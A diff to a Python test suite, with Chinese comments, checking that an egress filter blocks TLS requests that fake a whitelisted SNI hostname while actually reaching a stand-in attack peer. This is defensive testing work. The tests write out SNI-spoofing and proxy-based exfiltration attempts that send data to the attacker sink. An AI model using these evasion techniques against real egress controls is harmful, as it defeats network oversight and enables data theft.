@@ -1412,10 +1412,11 @@ class TestTlsSniCannotLie:
         """**文档化参数**：`httpx` 的 `extensions={"sni_hostname": …}`（审查者用的那条）。"""
         _assert_peer_not_learned(ATTACK_PEER)
         sink = make_sink(ATTACK_PEER)
-        with pytest.raises(EgressBlocked):
+        with pytest.raises(EgressBlocked) as ei:
             with httpx.Client(verify=False, timeout=3) as cl:
                 cl.request("GET", "https://%s:%d/" % (ATTACK_PEER, sink.port),
                            extensions={"sni_hostname": "open.bigmodel.cn"})
+        _assert_blocked_by(ei.value, "ssl.SSLContext.wrap_socket（客户端 TLS）")
         assert sink.payloads() == b""
 
     def test_lying_sni_via_urllib3_server_hostname_blocked(self, make_sink):
@@ -1426,8 +1427,9 @@ class TestTlsSniCannotLie:
         pool = urllib3.HTTPSConnectionPool(ATTACK_PEER, sink.port,
                                            server_hostname="open.bigmodel.cn",
                                            cert_reqs="CERT_NONE", retries=False)
-        with pytest.raises(EgressBlocked):
+        with pytest.raises(EgressBlocked) as ei:
             pool.urlopen("GET", "/", timeout=3)
+        _assert_blocked_by(ei.value, "ssl.SSLContext.wrap_socket（客户端 TLS）")
         assert sink.payloads() == b""
 
     def test_lying_sni_through_explicit_tls_proxy_blocked(self, make_sink):
@@ -1438,11 +1440,13 @@ class TestTlsSniCannotLie:
         """
         _assert_peer_not_learned(ATTACK_PEER)
         sink = make_sink(ATTACK_PEER)
-        with pytest.raises(EgressBlocked):
+        with pytest.raises(EgressBlocked) as ei:
             with httpx.Client(verify=False, timeout=3,
                               proxy="https://%s:%d" % (ATTACK_PEER, sink.port)) as cl:
                 cl.request("POST", "https://not-whitelisted.example/x", json={"a": 1},
                            extensions={"sni_hostname": "open.bigmodel.cn"})
+        # 归因：这条路只有 F 层在拦（日志实测：E 层对该 URL 不参与命中）
+        _assert_blocked_by(ei.value, "ssl.SSLContext.wrap_socket（客户端 TLS）")
         assert sink.payloads() == b"", "CONNECT 明文进了 TLS 之内并到达监听器"
 
     def test_whitelisted_sni_with_learned_peer_is_allowed(self, make_sink):
